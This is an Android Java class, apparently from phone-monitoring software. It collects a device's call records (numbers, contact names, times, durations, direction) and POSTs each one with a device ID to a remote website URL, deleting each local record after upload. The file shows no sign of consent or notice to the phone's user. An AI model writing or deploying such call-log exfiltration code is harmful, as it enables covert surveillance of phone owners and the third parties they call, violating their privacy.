package iits.mamager;

import android.content.Context;
import iits.code.bus.Call_BUS;
import iits.code.dao.Call_DAO;
import iits.code.dto.Call_DTO;
import iits.common.Constants;
import iits.common.Format;
import iits.common.HTTPWeb;
import java.util.ArrayList;

public class CallManager {
    private static final String TAG = "CallManager";

    private static ArrayList<String> getArrayParameterKeyCall() {
        ArrayList<String> arrKey = new ArrayList<>();
        arrKey.add("deviceid");
        arrKey.add("date");
        arrKey.add("time");
        arrKey.add("from");
        arrKey.add("to");
        arrKey.add("direction");
        arrKey.add(Call_DAO.KEY_DURATION);
        arrKey.add("name");
        arrKey.add("os");
        return arrKey;
    }

    private static ArrayList<String> getArrayParameterValueCall(String deviceID, Call_DTO call) {
        ArrayList<String> arrValue = new ArrayList<>();
        if (deviceID.equals("") || call == null) {
            return null;
        }
        arrValue.add(String.valueOf(deviceID));
        arrValue.add(Format.formatDate(call.getTime()));
        arrValue.add(Format.formatTime(call.getTime()));
        if (call.getDirection() == 1) {
            arrValue.add(call.getNumber());
            arrValue.add("0");
        } else {
            arrValue.add("0");
            arrValue.add(call.getNumber());
        }
        arrValue.add(String.valueOf(call.getDirection()));
        arrValue.add(Format.formatDuration(call.getDuration()));
        arrValue.add(call.getName());
        arrValue.add(Constants.OS);
        return arrValue;
    }

    public static void sendDataOfCallToWebsite(Context context, String url, String deviceID) {
        try {
            ArrayList<Call_DTO> arrCall = Call_BUS.getAlls(context);
            ArrayList<String> arrKey = getArrayParameterKeyCall();
            int n = arrCall.size() - 1;
            FileManager.WriteLog(1, TAG, "n= " + String.valueOf(n + 1));
            for (int i = n; i >= 0; i--) {
                if (HTTPWeb.sendPostMethod(url, arrKey, getArrayParameterValueCall(deviceID, arrCall.get(i))) != null) {
                    FileManager.WriteLog(1, TAG, "send call: " + arrCall.get(i).getNumber());
                    Call_BUS.delete(context, arrCall.get(i).getID());
                    arrCall.remove(i);
                }
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on sendDataOfCallToWebsite function: " + e.toString());
        }
    }
}
